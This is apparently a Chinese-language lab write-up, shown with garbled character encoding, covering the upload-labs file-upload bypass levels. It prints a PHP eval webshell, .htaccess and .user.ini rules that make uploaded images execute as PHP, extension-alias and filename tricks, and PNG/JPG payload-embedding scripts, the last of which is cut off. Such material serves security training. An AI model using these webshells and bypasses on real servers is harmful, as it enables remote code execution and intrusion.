<h2 id="å¯¹contentçš„è¿‡æ»¤"><a href="#å¯¹contentçš„è¿‡æ»¤" class="headerlink" title="å¯¹contentçš„è¿‡æ»¤"></a>å¯¹contentçš„è¿‡æ»¤</h2><p>**&lt;?&#x3D; ?&gt;<strong>ä¸</strong>&lt;?php ?&gt;<strong>ä¸</strong>&lt;script language&#x3D;â€phpâ€&gt; &lt;&#x2F;script&gt;**éƒ½å¯ä»¥æ ‡è¯†phpä»£ç ã€‚</p>
<p>å½“æ–‡ä»¶å†…å®¹ä¸­ä¸èƒ½å‡ºç°&lt;?ï¼Œ&lt;script language&#x3D;â€phpâ€&gt;ä¹Ÿä¸èƒ½èµ·ä½œç”¨ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥å°†contentè¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå€ŸåŠ©.htaccessæ–‡ä»¶è§£ç å¹¶è§£æcontentã€‚å¦‚ä¸‹ï¼š</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jt</span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=./1.jt</span></span><br></pre></td></tr></table></figure>

<p>PASS-1</p>
<p><strong>åªæœ‰å‰ç«¯éªŒè¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆé€‰æ‹©<code>.jpg</code>åç¼€çš„æ–‡ä»¶ï¼Œç»•è¿‡å‰ç«¯éªŒè¯ï¼Œå†<code>bp</code>æŠ“åŒ…ä¿®æ”¹åç¼€ä¾¿å¯ç»•è¿‡æ£€æŸ¥ã€‚</strong></p>
<p>é€‰æ‹©æ–‡ä»¶<code>exp.jpg</code>å…¶å†…å®¹å¦‚ä¸‹ï¼Œ<code>bp</code>æŠ“åŒ…ä¿®æ”¹åç¼€ä¸º<code>.php</code>å‘é€ï¼Œä¸Šä¼ æˆåŠŸ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A   <span class="comment">#è¿™é‡Œè¿™ä¸ªä¸å½±å“</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>F12</code>åœ¨æŸ¥çœ‹å™¨ä¸­æ‰¾åˆ°ä¸Šä¼ æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915581.png" alt="image-20241015152329058" style="zoom:50%;" />

<p>åœ¨èšå‰‘ä¸­è¿æ¥æˆåŠŸ</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915884.png" alt="image-20241015152616491" style="zoom:50%;" />

<h2 id="MIMEéªŒè¯"><a href="#MIMEéªŒè¯" class="headerlink" title="MIMEéªŒè¯"></a><code>MIME</code>éªŒè¯</h2><p><strong>æ·»åŠ äº†<code>MIME</code>ä¿¡æ¯éªŒè¯ï¼Œä¸€èˆ¬å°†<code>Content-Type</code>é€‰é¡¹ä¿®æ”¹æˆ<code>image/jpeg</code>ã€<code>image/png</code>ã€<code>image/gif</code>è¿™ä¸‰ä¸ªä¸­çš„ä¸€ä¸ªå³å¯ã€‚</strong></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915412.png" alt="image-20241015154351022"></p>
<h2 id="åˆ«åæ›¿æ¢"><a href="#åˆ«åæ›¿æ¢" class="headerlink" title="åˆ«åæ›¿æ¢"></a>åˆ«åæ›¿æ¢</h2><p><strong>æ·»åŠ äº†é»‘åå•è¿‡æ»¤ï¼Œä¸å…è®¸ä¸Šä¼  <code>.asp .aspx .php .jsp</code>åç¼€æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡åˆ«åç»•è¿‡ã€‚</strong></p>
<p><code>asp aspx jsp php</code>çš„åˆ«åï¼š</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">asa cer cdx</span><br><span class="line">ashx asmx ascx</span><br><span class="line">jspx jspf</span><br><span class="line">php2 php3 php4 php5 phps phtml     ApacheæœåŠ¡å™¨å¯ä»¥æ›¿æ¢</span><br></pre></td></tr></table></figure>

<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a><code>wp</code></h4><p><code>bp</code>æŠ“åŒ…ï¼Œæ·»åŠ åˆ«åçˆ†ç ´</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915351.png" alt="image-20241015163720337" style="zoom:50%;" />

<p>æ ¹æ®<code>Response</code>çŠ¶æ€ï¼Œç¡®å®šå¯ç”¨åˆ«åï¼ŒæˆåŠŸä¸Šä¼ </p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915697.png" alt="image-20241015163919606" style="zoom:50%;" />

<p>åœ¨<code>Response</code>ä¸­å¯»æ‰¾è¿”å›çš„ç›¸å¯¹è·¯å¾„</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915703.png" alt="image-20241015164714757" style="zoom:50%;" />

<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a><code>.htaccess</code></h2><p><strong>æŸ¥çœ‹æºç ï¼Œå‘ç°é»‘åå•è¿‡æ»¤äº†å‡ ä¹æ‰€æœ‰å¯ç”¨åç¼€ï¼Œæ­¤æ—¶å°±è¦ç”¨åˆ°<code>.htaccess</code>äº†ï¼Œæ³¨æ„<code>.htaccess</code>æ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>â€‹	<code>.htaccess</code>æ˜¯<code>Apache</code>æœåŠ¡ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡<code>.htaccess</code>æ–‡ä»¶ï¼Œå¯ä»¥å¸®åŠ©å®ç°ï¼šç½‘é¡µ<code>301</code>é‡å®šå‘ï¼Œè‡ªå®šä¹‰<code>404</code>é”™è¯¯é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‹“å±•åï¼Œå…è®¸&#x2F;é˜»æ­¢ç‰¹å®šç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ï¼Œé…ç½®é»˜è®¤æ–‡æ¡£ç­‰ã€‚</p>
<p>â€‹	å¸¸ç”¨çš„<code>.htaccess</code>æ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;exp.jpg&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>â€‹	<code>SetHandler application/x-httpd-php</code>çš„æ„æ€æ˜¯è®¾ç½®å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨<code>php</code>è§£æï¼Œé‚£ä¹ˆæ— è®ºä¸Šä¼ ä»€ä¹ˆæ–‡ä»¶ï¼Œåªè¦ç¬¦åˆ<code>php</code>è¯­è¨€ä»£ç è§„èŒƒï¼Œå°±ä¼šè¢«å½“ä½œ<code>php</code>æ‰§è¡Œã€‚</p>
<p>è¿™ä¸€å…³æˆ‘æœ¬åœ°ç¯å¢ƒæœ‰é—®é¢˜ï¼Œæ˜¯åœ¨<a href="http://175.178.67.176:8084/">è¿™é‡Œ</a>é€šå…³çš„ã€‚</p>
<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a><code>.user.ini</code></h2><p>å¼•å‘<code>.user.ini</code>è§£ææ¼æ´éœ€è¦ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸º<code>php</code></li>
<li>æœåŠ¡å™¨ä½¿ç”¨<code>CGI/FastCGI</code>æ¨¡å¼</li>
<li>ä¸Šä¼ ç›®å½•ä¸‹æœ‰å¯æ‰§è¡Œçš„<code>php</code>æ–‡ä»¶</li>
</ul>
<p><code>.user.ini</code>åˆ©ç”¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = exp.jpg</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ è¯¥<code>.user.ini</code>æ–‡ä»¶ï¼Œå†ä¸Šä¼ <code>exp.jpg</code>æ–‡ä»¶</p>
<h2 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h2><p>æºç ä¸­æ²¡æœ‰<code>strtolower()</code>å¯ä»¥åˆ©ç”¨å¤§å°å†™ç»•è¿‡ï¼Œ<code>strtolower()</code>å‡½æ•°å°†å¤§å†™å­—æ¯è½¬ä¸ºå°å†™å­—æ¯ã€‚</p>
<h2 id="Pass-0708"><a href="#Pass-0708" class="headerlink" title="Pass-0708"></a><code>Pass-0708</code></h2><p>æºç ä¸­æ²¡æœ‰<code>trim()</code>å¯ä»¥ç©ºæ ¼ç»•è¿‡ï¼Œæ²¡æœ‰<code>deldot()</code>å¯ä»¥åç¼€åŠ ç‚¹ç»•è¿‡ã€‚</p>
<ul>
<li><code>trim()</code>å‡½æ•°ä¼šå»é™¤å­—ç¬¦ä¸²ä¸­çš„ç©ºæ ¼</li>
<li><code>deldot()</code>å‡½æ•°ä¼šåˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</li>
</ul>
<p><strong>æ³¨æ„å¿…é¡»åœ¨<code>windows</code>ç¯å¢ƒä¸‹ï¼Œ<code>php</code>ç‰ˆæœ¬éœ€ä¸º<code>5.3</code>ç‰ˆæœ¬ï¼Œ<code>7.3</code>ç‰ˆæœ¬ä¸è¡Œã€‚</strong></p>
<p>â€‹	å¦‚æœæºç ä¸­<code>deldot(),trim()</code>ä¾æ¬¡å­˜åœ¨ç”¨æ¥è¿‡æ»¤æ—¶ï¼Œå¦‚ä¸‹å›¾ï¼Œå¯ä»¥ä½¿ç”¨<code>.php. .</code>çš„æ–¹å¼ç»•è¿‡ï¼Œç»è¿‡ä¸¤æ¬¡è¿‡æ»¤åå‰©ä¸‹çš„ä¸º<code>.php.</code>ä¾ç„¶å¯ä»¥ç»•è¿‡é»‘åå•ã€‚ï¼ˆåœ¨<code>Pass-10</code>ä¸­åˆ©ç”¨æ­¤æ–¹æ³•é€šå…³ï¼‰</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914526.png" alt="image-20241015225415994" style="zoom:50%;" />

<p>åæ­£å°±æ˜¯åˆ†ææºç ï¼Œæ‰¾åˆ°ç»•è¿‡æ–¹å¼ï¼Œå¦‚æœä½¿ç”¨äº†ä¸¤æ¬¡<code>trim()</code>å¯èƒ½è¦å¤šåŠ ä¸€ä¸ªç©ºæ ¼ã€‚</p>
<h2 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a><code>::$DATA</code></h2><p>â€‹	åœ¨<code>Windows</code>ç¯å¢ƒä¸‹ï¼Œä¸Šä¼ çš„æ–‡ä»¶åç¼€ä¸º<code>.php::$DATA</code>æ—¶ï¼ŒæœåŠ¡å™¨ä¸Šä¼šç”Ÿæˆä¸€ä¸ªåç¼€ä¸º<code>.php</code>çš„æ–‡ä»¶ï¼Œå…¶å†…å®¹ä¸åç¼€ä¸º<code>.php::$DATA</code>çš„æ–‡ä»¶çš„å†…å®¹ä¸€æ ·ã€‚</p>
<h2 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h2><p>&#x3D;&#x3D;Pass-11&#x3D;&#x3D;</p>
<p>â€‹	<code>bp</code>æ”¹åç¼€ä¸º<code>.pphphp</code>ï¼Œè¿‡æ»¤æ‰ç¬¬ä¸€ä¸ª<code>php</code>åï¼ŒæˆåŠŸä¸Šä¼ çš„æ–‡ä»¶åç¼€è¿˜æ˜¯<code>.php</code>ï¼›å¦‚æœæ”¹æˆ<code>.phphpp</code>ï¼Œè¿‡æ»¤æ‰ç¬¬ä¸€ä¸ª<code>php</code>åï¼Œå‰©ä¸‹çš„æ˜¯<code>.hpp</code>ï¼Œä¸å¯ï¼›å¦‚æœæ˜¯<code>.phpphp</code>è¿™æ ·ï¼Œä¸æ˜¯åŒå†™ï¼Œä¸å¯ã€‚</p>
<h2 id="å›¾ç‰‡é©¬"><a href="#å›¾ç‰‡é©¬" class="headerlink" title="å›¾ç‰‡é©¬"></a>å›¾ç‰‡é©¬</h2><p>â€‹	ç¬¬<code>14</code>å…³çš„æ£€æŸ¥æ–¹å¼æ˜¯ï¼Œé€šè¿‡è·å–ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹çš„å‰ä¸¤ä¸ªå­—èŠ‚æ¥åˆ¤æ–­è¯¥æ–‡ä»¶çš„ç±»å‹ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡è¯†åˆ«æ–‡ä»¶å¤´åˆ¤æ–­æ–‡ä»¶ç±»å‹ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914749.png" alt="image-20241017191720004" style="zoom:50%;" />

<p>â€‹	ç¬¬<code>15</code>å…³åˆ™æ˜¯é€šè¿‡è·å–<code>getimagesize()</code>å‡½æ•°çš„è¿”å›ç»“æœæ¥æ£€æŸ¥æ–‡ä»¶ç±»å‹ï¼Œ<code>getimagesize()</code>å‡½æ•°çš„è¿”å›ç»“æœä¸­åŒ…å«æ–‡ä»¶å¤§å°å’Œæ–‡ä»¶ç±»å‹ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914785.png" alt="image-20241017191843665" style="zoom:50%;" />

<p>ç¬¬<code>16</code>å…³æ˜¯é€šè¿‡<code>exif_imagetype()</code>å‡½æ•°æ¥è¯†åˆ«æ–‡ä»¶å¤´ã€‚</p>
<p>ä¸Šé¢ä¸‰ç§æ£€æŸ¥æ–¹æ³•å…¶å®éƒ½å·®ä¸å¤šï¼Œéƒ½å¯ä»¥åˆ©ç”¨ä¸‹é¢ä¸¤ç§ç»•è¿‡æ–¹æ³•ç»•è¿‡ï¼š</p>
<h4 id="æ·»åŠ æ–‡ä»¶å¤´"><a href="#æ·»åŠ æ–‡ä»¶å¤´" class="headerlink" title="æ·»åŠ æ–‡ä»¶å¤´"></a>æ·»åŠ æ–‡ä»¶å¤´</h4><p>åœ¨æ–‡ä»¶çš„é¦–è¡Œæ·»åŠ <code>GIF89a</code>è¡¨ç¤ºä¸º<code>gif</code>æ–‡ä»¶ï¼Œæ·»åŠ <code>PNG</code>æ–‡ä»¶å¤´è¡¨ç¤ºä¸º<code>png</code>æ–‡ä»¶</p>
<h4 id="ä½¿ç”¨copyå‘½ä»¤"><a href="#ä½¿ç”¨copyå‘½ä»¤" class="headerlink" title="ä½¿ç”¨copyå‘½ä»¤"></a>ä½¿ç”¨<code>copy</code>å‘½ä»¤</h4><p>åœ¨<code>cmd</code>ä¸­ï¼Œæ‰§è¡Œ<code>copy zyt.jpg + exp.php zyt.jpg</code>å‘½ä»¤</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914014.png" alt="image-20241017190732155" style="zoom:50%;" />

<p><strong>é€šå…³æ­¥éª¤ï¼š</strong></p>
<p>å…ˆä¸Šä¼ ä¸‹é¢æ–‡ä»¶</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914396.png" alt="image-20241017191047498" style="zoom:50%;" />

<p>è·å–æ–‡ä»¶è·¯å¾„åé…åˆæ–‡ä»¶åŒ…å«æ¼æ´è§£æè„šæœ¬</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914040.png" alt="image-20241017191238563" style="zoom:50%;" />

<p>å‘<code>file</code>ä¼ å‚è·å–<code>webshell</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914091.png" alt="image-20241017191428286" style="zoom:50%;" />

<h2 id="äºŒæ¬¡æ¸²æŸ“"><a href="#äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“"></a>äºŒæ¬¡æ¸²æŸ“</h2><p>&#x3D;&#x3D;Pass-17&#x3D;&#x3D;</p>
<p>æœ¬å…³ä¼šå…ˆæ£€æŸ¥æ–‡ä»¶ç±»å‹ï¼Œå¿…é¡»è¦æ˜¯ä¸è¢«æŸå<code>gif,png,jpg</code>æ–‡ä»¶ï¼Œæ‰èƒ½ä¸Šä¼ æˆåŠŸã€‚<br>å¹¶ä¸”<code>imagecreatefromjpeg()</code>å‡½æ•°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ï¼Œä¿ç•™ä¸‹æ¥çš„æ–‡ä»¶æ˜¯äºŒæ¬¡æ¸²æŸ“åçš„æ–‡ä»¶ã€‚<br>æœ€åè¿˜è¦é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè§£æè„šæœ¬ã€‚</p>
<h4 id="gif"><a href="#gif" class="headerlink" title="gif"></a><code>gif</code></h4><p>ç›´æ¥æ¯”è¾ƒæ¸²æŸ“å‰åçš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ‰¾åˆ°æ•°æ®æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„éƒ¨åˆ†ï¼Œåœ¨æ¸²æŸ“å‰æ–‡ä»¶ä¸­çš„è¯¥éƒ¨åˆ†æ’å…¥<code>webshell</code>å³å¯ã€‚</p>
<p><strong>é€šå…³æ­¥éª¤ï¼š</strong></p>
<p>ä¸Šä¼ <code>1.gif</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914203.png" alt="image-20241017212528750" style="zoom:50%;" />

<p>å°†<code>1.gif</code>ä¸äºŒæ¬¡æ¸²æŸ“åçš„æ–‡ä»¶<code>31494.gif</code>æ¯”è¾ƒï¼Œæ‰¾åˆ°æœªå˜åŒ–éƒ¨åˆ†ï¼Œæ’å…¥<code>webshell</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914601.png" alt="image-20241017212812152" style="zoom:50%;" />

<p>ä¸Šä¼ ä¿®æ”¹åçš„<code>1.gif</code>ï¼Œå¾—åˆ°äºŒæ¬¡æ¸²æŸ“åçš„æ–‡ä»¶<code>32588.gif</code>ï¼Œç°åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­çš„<code>webshell</code>æ²¡æœ‰å†è¢«ä¿®æ”¹äº†</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914819.png" alt="image-20241017212952403" style="zoom:50%;" />

<p>é…åˆæ–‡ä»¶åŒ…å«æ¼æ´æˆåŠŸè§£æè„šæœ¬</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131913540.png" alt="image-20241017213048163" style="zoom:50%;" />

<h4 id="png"><a href="#png" class="headerlink" title="png"></a><code>png</code></h4><p><code>ALT+4</code>æŸ¥çœ‹æ¨¡æ¿è¿è¡Œç»“æœ</p>
<p><strong>è„šæœ¬ï¼š</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>0</code>ä¼ å‡½æ•°åï¼Œ<code>1</code>ä¼ å‚æ•°ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131913292.png" alt="image-20241018210855348" style="zoom:50%;" />

<h4 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a><code>jpg</code></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ 